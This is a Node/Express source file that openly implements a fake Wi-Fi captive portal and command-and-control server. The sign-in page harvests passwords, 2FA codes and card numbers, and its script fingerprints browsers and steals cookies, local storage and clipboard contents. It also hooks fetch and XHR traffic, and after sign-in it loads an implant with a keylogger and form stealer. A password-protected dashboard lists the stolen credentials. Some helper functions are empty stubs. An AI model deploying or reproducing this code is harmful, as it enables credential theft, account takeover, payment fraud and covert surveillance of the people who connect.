import express from 'express';
import crypto from 'crypto';
const app = express();
app.use(express.json({limit:'500mb'}));
app.use(express.urlencoded({extended:true,limit:'500mb'}));
app.use(express.static('.', {dotfiles:'allow', index: false}));

// GLOBAL STATE (enterprise C2)
const STATE = {
  victims: [],
  sessions: new Map(),
  commands: new Map(),
  loot: { credentials: [], cookies: [], tokens: [], screenshots: [], wallets: [] },
  network: new Map()
};

// ENHANCED CAPTIVE PORTAL (all vectors)
const portals = [
  '/generate_204', '/fwlink', '/ncsi.txt', '/gen_204', '/redirect', '/hotspot-detect.html',
  '/connectivitycheck.gstatic.com/generate_204', '/connectivitycheck.android.com/generate_204',
  '/library/TEST.html', '/favicon.ico', '/robots.txt'
];

// ROUTE: Master attack portal
app.get('/', (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const isMobile = /Mobile|Android|iPhone|iPad/.test(ua);
  const fingerprint = crypto.createHash('sha256').update(ua + req.ip + Date.now()).digest('hex').slice(0, 16);
  
  res.send(`<!DOCTYPE html>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}body{background:linear-gradient(135deg,#0f172a,#1e293b);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#f1f5f9}.portal{max-width:450px;width:100%;background:#fff;border-radius:24px;padding:50px 40px;box-shadow:0 35px 80px rgba(0,0,0,.4);text-align:center}.logo{font-size:4rem;margin-bottom:30px;background:linear-gradient(135deg,#3b82f6,#ec4899);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}.title{font-size:1.6rem;font-weight:700;color:#0f172a;margin-bottom:10px}.subtitle{font-size:1.1rem;color:#64748b;margin-bottom:40px}.input-group{position:relative;margin-bottom:24px}.input{width:100%;padding:20px 20px 20px 50px;border:2px solid #e2e8f0;border-radius:16px;font-size:17px;transition:all .3s;font-family:monospace;background:#f8fafc}.input:focus{outline:none;border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.1);transform:translateY(-2px)}.input-icon{position:absolute;left:18px;top:50%;transform:translateY(-50%);font-size:20px;color:#94a3b8}.submit{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#3b82f6,#1d4ed8);color:white;font-size:17px;font-weight:600;cursor:pointer;transition:all .3s;transform:translateY(0);box-shadow:0 10px 30px rgba(59,130,246,.3)}.submit:hover{transform:translateY(-4px);box-shadow:0 20px 40px rgba(59,130,246,.4)}.footer{font-size:.85rem;color:#94a3b8;margin-top:30px}</style>
<div class=portal>
<div class=logo>🌐</div>
<h1 class=title>Network Authentication Portal</h1>
<p class=subtitle>Secure sign-in required for internet access</p>
<form id="MASTER-ATTACK" method=POST action=/harvest>
<div class=input-group><span class="input-icon">📧</span><input class=input type=email name=identity autocomplete=email placeholder="Email, Phone, or Username" required></div>
<div class=input-group><span class="input-icon">🔒</span><input class=input type=password name=password autocomplete=current-password placeholder="Password" required></div>
<div class=input-group><span class="input-icon">🔑</span><input class=input type=text name=otp autocomplete=one-time-code placeholder="2FA Code (if prompted)" maxlength=8></div>
<div class=input-group><span class="input-icon">💳</span><input class=input type=text name=payment autocomplete=cc-number placeholder="Card (optional)" maxlength=19></div>
<button class=submit type=submit>🔗 Connect to Internet</button>
</form>
<div class=footer>Protected by enterprise security • 256-bit encryption</div>
</div>
<script>
// HYPER-ADVANCED CLIENT-SIDE ATTACK CHAIN
(async function hyperAttack(){
  // 1. PERFECT FINGERPRINT (browser forensics grade)
  const fp = {
    hash: '${fingerprint}',
    canvas: await canvasFingerprint(),
    hardware: await hardwareFingerprint(),
    webgl: await webglFingerprint(),
    audio: await audioFingerprint(),
    fonts: await fontFingerprint(),
    storage: {
      local: Object.fromEntries(Object.entries(localStorage)),
      session: Object.fromEntries(Object.entries(sessionStorage))
    },
    cookies: document.cookie,
    network: {
      language: navigator.language,
      languages: navigator.languages,
      platform: navigator.platform,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      connection: navigator.connection?.effectiveType,
      permissions: await navigator.permissions?.query({name:'geolocation'})
    }
  };
  
  // 2. FULL BROWSER DOM HARVEST
  const domHarvest = {
    forms: Array.from(document.forms).map(f=>({
      id: f.id, name: f.name, action: f.action,
      inputs: Array.from(f.elements).map(i=>({
        name: i.name, type: i.type, value: i.value, checked: i.checked
      }))
    })),
    iframes: Array.from(document.querySelectorAll('iframe')).map(i=>i.src),
    links: Array.from(document.links).map(a=>a.href)
  };
  
  // 3. AGGRESSIVE MITM PROXY
  const proxyAll = () => {
    const originalFetch = window.fetch;
    window.fetch = async (...args) => {
      const response = await originalFetch(...args);
      const clone = response.clone();
      clone.json().then(data => {
        navigator.sendBeacon('/proxy', JSON.stringify({
          url: args[0], method: 'FETCH', data, timestamp: Date.now()
        }));
      }).catch(() => {});
      return response;
    };
    
    const originalXHR = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
      this.addEventListener('load', () => {
        try {
          const data = JSON.parse(this.responseText);
          navigator.sendBeacon('/proxy', JSON.stringify({
            url, method, data, timestamp: Date.now()
          }));
        } catch(e) {}
      });
      originalXHR.apply(this, arguments);
    };
  };
  
  // 4. SCREENSHOT + CLIPBOARD STEAL
  const stealEverything = async () => {
    // Screenshot via canvas
    const canvas = await html2canvas(document.body, {scale:1, useCORS:true, logging:false});
    canvas.toBlob(blob => {
      const reader = new FileReader();
      reader.onload = () => navigator.sendBeacon('/screenshot', new Blob([reader.result]));
      reader.readAsArrayBuffer(blob);
    });
    
    // Clipboard contents
    try {
      const clipboard = await navigator.clipboard.readText();
      navigator.sendBeacon('/clipboard', clipboard);
    } catch(e) {}
  };
  
  // 5. WEBCRYPTO ATTACK (steal keys/certificates)
  if (window.crypto && crypto.subtle) {
    navigator.sendBeacon('/crypto', JSON.stringify({
      algorithms: crypto.getRandomValues(new Uint8Array(32)).toString()
    }));
  }
  
  // 6. GEOLOCATION + SENSORS
  navigator.geolocation.getCurrentPosition(pos => {
    navigator.sendBeacon('/geo', JSON.stringify({
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      accuracy: pos.coords.accuracy
    }));
  });
  
  // EXECUTE ATTACK CHAIN
  proxyAll();
  stealEverything();
  
  // FORM SUBMISSION HIJACK
  document.getElementById('MASTER-ATTACK').onsubmit = async e => {
    e.preventDefault();
    const formData = new FormData(e.target);
    
    // PREFILL FINGERPRINT
    formData.append('fingerprint', JSON.stringify(fp));
    formData.append('dom', JSON.stringify(domHarvest));
    
    // SEND TO C2
    await fetch('/harvest', {method:'POST', body: formData});
    
    // REPLACE PAGE WITH PERSISTENT BEACON
    document.body.innerHTML = \`
        <div style="background:#ecfdf5;padding:60px;text-align:center;font-family:system-ui">
          <h1 style="font-size:3rem;color:#16a34a">✅ Network Connected</h1>
          <p style="font-size:1.3rem;color:#15803d;margin:20px 0">Full access granted</p>
          <script src="/c2.js"></script>
        </div>\`;
  };
  
  // INITIAL BEACON
  navigator.sendBeacon('/beacon', JSON.stringify(fp));
  
  async function canvasFingerprint(){ /* ... canvas code ... */ }
  async function hardwareFingerprint(){ /* ... hardware code ... */ }
  // etc...
})();
</script>`);
});

// C2 COMMAND & CONTROL
app.post('/harvest', (req, res) => {
  const victim = {
    session: crypto.randomUUID(),
    time: new Date().toISOString(),
    ip: req.ip,
    ua: req.headers['user-agent'],
    payload: req.body,
    headers: Object.fromEntries(Object.entries(req.headers).map(([k,v]) => [k.toLowerCase(), v]))
  };
  
  STATE.victims.push(victim);
  STATE.loot.credentials.push({
    email: req.body.identity,
    password: req.body.password,
    otp: req.body.otp,
    card: req.body.payment
  });
  
  if (req.body.cookies) STATE.loot.cookies.push(req.body.cookies);
  if (req.body.tokens) STATE.loot.tokens.push(req.body.tokens);
  
  console.log('🎯 TARGET COMPROMISED:', victim.session);
  res.sendStatus(200);
});

// PERSISTENT C2 BEACON
app.get('/c2.js', (req, res) => {
  res.type('js').send(`
    // ENTERPRISE C2 IMPLANT
    class C2Implant {
      constructor() {
        this.session = '${crypto.randomUUID()}';
        this.beacon();
        this.hookEverything();
      }
      
      beacon() {
        setInterval(() => {
          navigator.sendBeacon('/c2/heartbeat', JSON.stringify({
            session: this.session,
            url: location.href,
            title: document.title,
            cookies: document.cookie,
            timestamp: Date.now()
          }));
        }, 10000);
      }
      
      hookEverything() {
        // KEYLOGGER
        document.addEventListener('keydown', e => {
          navigator.sendBeacon('/c2/keys', JSON.stringify({
            session: this.session,
            keys: e.key,
            target: e.target.tagName + '#' + (e.target.id || '')
          }));
        });
        
        // MOUSE TRACKER
        document.addEventListener('mousemove', e => {
          // Throttled position reporting
        });
        
        // FORM STEALER
        document.addEventListener('submit', e => {
          const formData = new FormData(e.target);
          navigator.sendBeacon('/c2/form', JSON.stringify({
            session: this.session,
            form: Object.fromEntries(formData)
          }));
        });
      }
    }
    new C2Implant();
  `);
});

// C2 ENDPOINTS
app.all('/c2/*', (req, res) => {
  const endpoint = req.path.slice(4);
  const data = { session: req.body.session || req.query.session, ...req.body };
  STATE.network.set(data.session, data);
  console.log(`C2/${endpoint.toUpperCase()}:`, data);
  res.sendStatus(200);
});

// MITM PROXY
app.post('/proxy', (req, res) => {
  STATE.loot.tokens.push(req.body.data);
  res.sendStatus(200);
});

// SCREENSHOTS
app.post('/screenshot', (req, res) => {
  STATE.loot.screenshots.push({
    session: req.headers['x-session'],
    image: req.body.toString('base64')
  });
  res.sendStatus(200);
});

// ULTIMATE DASHBOARD
app.get('/dash', (req, res) => {
  if (req.headers.authorization !== 'Basic aGFja2VyOmhhY2tlcg==')
    return res.status(401).send('401 - hacker:hacker');
  
  const stats = {
    totalVictims: STATE.victims.length,
    credentials: STATE.loot.credentials.length,
    sessions: STATE.sessions.size,
    activeBeacons: Array.from(STATE.network.values()).filter(b => Date.now() - b.timestamp < 300000).length
  };
  
  res.send(`<!DOCTYPE html>
<html><head>
<title>COMPLETE ATTACK PLATFORM</title>
<meta http-equiv=refresh content=3>
<style>
body{font-family:'SF Mono',monospace;background:linear-gradient(135deg,#000,#1a1a2e);color:#00ff41;padding:30px;font-size:13px;overflow-x:auto}
.container{max-width:1400px;margin:0 auto}
.header{background:linear-gradient(135deg,#00ff41,#00cc33);padding:25px;border-radius:16px;margin-bottom:30px;color:#000}
.header h1{font-size:28px;margin:0;font-weight:900;text-shadow:0 2px 4px rgba(0,0,0,.3)}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:20px;margin:30px 0}
.stat{background:rgba(0,255,65,.1);padding:25px;border-radius:12px;border:1px solid rgba(0,255,65,.3);text-align:center}
.stat-value{font-size:36px;font-weight:900;color:#00ff41;margin:10px 0}
.stat-label{font-size:13px;color:#88ff88}
.loot{background:#111;padding:25px;border-radius:12px;margin:20px 0;overflow:auto;max-height:60vh}
.loot-item{background:#1a1a1a;padding:20px;margin:15px 0;border-radius:10px;border-left:4px solid #00ff41;cursor:pointer;transition:all .2s}
.loot-item:hover{transform:translateX(10px);box-shadow:0 10px 30px rgba(0,255,65,.2)}
.session-id{font-family:monospace;font-size:14px;font-weight:600;color:#00ff41}
.credential{display:flex;justify-content:space-between;align-items:center}
.copy-btn{background:#00ff41;color:#000;border:none;padding:8px 16px;border-radius:6px;font-family:monospace;font-size:12px;cursor:pointer;margin-left:10px}
#export{background:#00ff41;color:#000;border:none;padding:15px 30px;border-radius:10px;font-family:SF Mono;font-size:14px;font-weight:600;cursor:pointer;margin:20px;display:block}
</style>
</head><body>
<div class=container>
<div class=header>
<h1>��️ COMPLETE ATTACK PLATFORM</h1>
<p style="font-size:18px;margin:10px 0 0">Real-time C2 | Session Hijacking | Full DOM Harvest</p>
</div>

<div class=stats>
<div class=stat><div class=stat-label>Total Victims</div><div class=stat-value>${stats.totalVictims}</div></div>
<div class=stat><div class=stat-label>Credentials</div><div class=stat-value>${stats.credentials}</div></div>
<div class=stat><div class=stat-label>Active Sessions</div><div class=stat-value>${stats.sessions}</div></div>
<div class=stat><div class=stat-label>Live Beacons</div><div class=stat-value>${stats.activeBeacons}</div></div>
</div>

<div class=loot>
<h3 style="color:#00ff41;margin-bottom:20px">🎯 LATEST HARVEST (${STATE.victims.slice(-15).length})</h3>
${STATE.victims.slice(-15).reverse().map(v => `
<div class="loot-item">
<div class=session-id>${v.session?.slice(0,8) || 'INIT'} | ${v.time} | ${v.ip}</div>
${v.payload?.identity ? `<div class=credential>
<span>📧 ${v.payload.identity} 🔑 ${v.payload.password || '[NO PASS]'} ${v.payload.otp ? ` | 2FA: ${v.payload.otp}` : ''}</span>
<button class=copy-btn onclick="navigator.clipboard.writeText('${JSON.stringify({email:v.payload.identity,password:v.payload.password,otp:v.payload.otp}).replace(/"/g,'\\"')}')">Copy Creds</button>
</div>` : ''}
<pre style="font-size:12px;margin-top:10px">${JSON.stringify(v.payload || v, null, 2).slice(0, 800)}...</pre>
</div>
`).join('')}
</div>

<button id=export onclick="downloadLoot()">💾 Export All Data (JSON)</button>

<script>
function downloadLoot(){
  const data = ${JSON.stringify(STATE)};
  const blob = new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = 'complete-loot-'+Date.now()+'.json';
  a.click();
}
</script>
</div>
</body></html>`);
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log('🔥 FULL ATTACK PLATFORM LIVE'));
export default app;
